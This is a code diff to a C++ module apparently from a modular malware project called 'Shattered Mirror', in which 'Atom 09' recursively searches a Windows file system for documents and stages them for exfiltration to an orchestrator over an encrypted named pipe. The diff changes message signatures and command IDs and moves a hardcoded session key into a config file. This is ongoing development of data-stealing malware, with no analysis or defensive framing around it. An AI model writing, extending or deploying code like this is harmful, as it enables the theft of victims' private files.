@@ -1,4 +1,4 @@
-﻿/*=============================================================================
+/*=============================================================================
  * Shattered Mirror v1 — Atom 09: File System Traversal
  *
  * Recursively walks the file system looking for interesting files (documents, 
@@ -8,6 +8,7 @@
 
 #include "Atom_09_FileSys.h"
 #include "../Orchestrator/AtomManager.h"
+#include "../Orchestrator/Config.h"
 #include <cstring>
 
 /* Skip standard junk/system directories */
@@ -66,7 +67,8 @@ static void StageFileForExfil(HANDLE hPipe, const WCHAR* szFilePath, BYTE* pShar
         wsprintfA(szHeader, "FILE|%ws|%u", szFilePath, dwSize);
         
         IPC_MESSAGE msgMeta = { 0 };
-        msgMeta.CommandId = CMD_EXECUTE;
+        msgMeta.dwSignature = 0x534D4952;
+        msgMeta.CommandId = CMD_REPORT;
         msgMeta.dwPayloadLen = lstrlenA(szHeader) + 1;
         lstrcpyA((char*)msgMeta.Payload, szHeader);
         IPC_SendMessage(hPipe, &msgMeta, pSharedKey, 16);
@@ -78,7 +80,8 @@ static void StageFileForExfil(HANDLE hPipe, const WCHAR* szFilePath, BYTE* pShar
             if (chunk > MAX_IPC_PAYLOAD_SIZE) chunk = MAX_IPC_PAYLOAD_SIZE;
 
             IPC_MESSAGE msgData = { 0 };
-            msgData.CommandId = CMD_EXECUTE; // Exfil picks this up
+            msgData.dwSignature = 0x534D4952;
+            msgData.CommandId = CMD_REPORT; 
             msgData.dwPayloadLen = chunk;
             memcpy(msgData.Payload, pBuffer + offset, chunk);
 
@@ -131,7 +134,8 @@ DWORD WINAPI FileSystemAtomMain(LPVOID lpParam) {
     HANDLE hPipe = IPC_ConnectToPipe(dwAtomId);
     if (!hPipe) return 1;
 
-    BYTE SharedSessionKey[] = "A3RTwPJ8YRQ5Cf78";
+    BYTE SharedSessionKey[16];
+    memcpy(SharedSessionKey, Config::PSK_ID, 16);
 
     while (TRUE) {
         IPC_MESSAGE inMsg = { 0 };
